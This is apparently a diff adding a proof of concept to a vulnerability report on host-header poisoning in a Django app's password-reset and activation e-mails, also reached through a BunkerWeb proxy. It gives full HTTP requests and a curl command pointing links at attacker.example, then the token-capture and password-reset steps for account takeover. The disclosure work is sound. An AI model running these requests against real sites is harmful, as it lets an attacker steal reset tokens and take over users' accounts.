@@ -53,6 +53,36 @@ The redirect is accepted before advertisement approval, but its impact on other 
 
 Runtime testing on dedicated test accounts confirmed that account recovery links could reference an unauthorized external origin.
 
+Direct Django access (`Host` or `X-Forwarded-Host`, both honoured):
+
+```http
+POST /account/password-reset-request/ HTTP/1.1
+Host: attacker.example                  (or: X-Forwarded-Host: attacker.example)
+Cookie: csrftoken=<T>
+Content-Type: application/x-www-form-urlencoded
+
+csrfmiddlewaretoken=<T>&email=<victim>@tbox.traced
+→ 200 "If an account with that email exists, a reset link has been sent."
+```
+
+Through BunkerWeb, an absolute request line selects the real virtual host while the `Host` header is forwarded unchanged as `X-Forwarded-Host` (`proxy_set_header X-Forwarded-Host $http_host`):
+
+```bash
+curl --request-target "http://domain.com/account/password-reset-request/" -H "Host: attacker.example" \
+  -H "Cookie: csrftoken=<T>" --data "csrfmiddlewaretoken=<T>&email=<victim>@tbox.traced" http://<BUNKERWEB_IP>/
+# 200 "If an account with that email exists, a reset link has been sent."
+```
+
+In both cases the e-mail received by the victim contains:
+
+```
+Click the link to reset your password: http://attacker.example/account/password_reset/?token=<valid_token>
+```
+
+When the victim clicks the link, the token is sent to the attacker's host. The attacker then submits it to the real application (`POST /account/password_reset/` with `token`, `password1`, `password2` → `302 /account/login/`) and logs in with the new password.
+
+The same poisoning applies to account-activation e-mails (`POST /account/register/` with `X-Forwarded-Host: attacker.example` → `http://attacker.example/account/activate/?username=...&token=...`).
+
 Account takeover was demonstrated both through direct Django access and through BunkerWeb over HTTP and HTTPS.
 
 The reverse-proxy configuration does not consistently enforce the canonical application origin.
